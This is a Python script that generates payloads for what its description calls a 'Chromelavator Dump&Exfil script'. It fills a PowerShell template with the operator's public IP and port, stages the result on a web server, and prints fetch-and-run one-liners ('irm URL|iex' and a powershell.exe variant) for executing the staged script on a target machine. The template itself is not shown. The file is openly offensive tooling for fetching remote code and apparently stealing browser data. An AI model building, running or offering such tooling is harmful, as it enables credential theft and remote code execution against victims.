#!/usr/bin/env python3

from common import *
import argparse
import urllib.request
import random
import os
import sys

# Path Setup

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
DEPLOY_DIR = os.path.join(ROOT_DIR, "server", "deploy")
DEFAULT_TEMPLATE = os.path.join(SCRIPT_DIR, "template.ps1")

# Helpers

def generate_outfile_name() -> str:
    return ''.join(random.choices('0123456789abcdef', k=5))

def load_script(path: str) -> str:
    with open(path, "r") as f:
        return f.read()

def save_script(data: str, path: str) -> None:
    with open(path, "w") as f:
        f.write(data)

def pull_ip() -> str:
    return urllib.request.urlopen("https://checkip.amazonaws.com").read().decode().strip()

# Main

def generate_payload(template=DEFAULT_TEMPLATE, host=pull_ip(), port="8000"):
    if not os.path.isabs(template):
        template = os.path.join(SCRIPT_DIR, template)

    if not os.path.exists(template):
        failed(f"Template does not exist: {template}")
        sys.exit(1)

    os.makedirs(DEPLOY_DIR, exist_ok=True)
    info(f"Loading template ({template})")

    deploy_script = (
        load_script(template)
        .replace("<HOST>", host)
        .replace("<PORT>", port)
    )

    file_name = generate_outfile_name()
    full_outpath = os.path.join(DEPLOY_DIR, file_name)

    save_script(deploy_script, full_outpath)
    success(f"Output saved at: {full_outpath}")

    url = f"http://{host}:{port}/deploy/{file_name}"

    execution_methods = {
        0 : ("Direct execution of payload -> $ ", f"{BLUE}irm {url}|iex{RESET}"),
        1 : ("Powershell execution -> $ ", f"{BLUE}powershell.exe -c 'irm {url}|iex'{RESET}"),
    }

    for index in range(0, len(execution_methods)):
        success(f"{execution_methods[index][0]+execution_methods[index][1]}")

    info("Done.")

    return execution_methods, url


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Auto generate a simple quick Chromelavator Dump&Exfil script."
    )

    parser.add_argument("--template", "-t", default=DEFAULT_TEMPLATE, help="Template file")
    parser.add_argument("--host", "-H", default=pull_ip(), help="Remote Host")
    parser.add_argument("--port", "-p", default="8000", help="Remote Port")

    args = parser.parse_args()

    generate_payload(args.template, args.host, args.port)

if __name__ == '__main__':
    main()
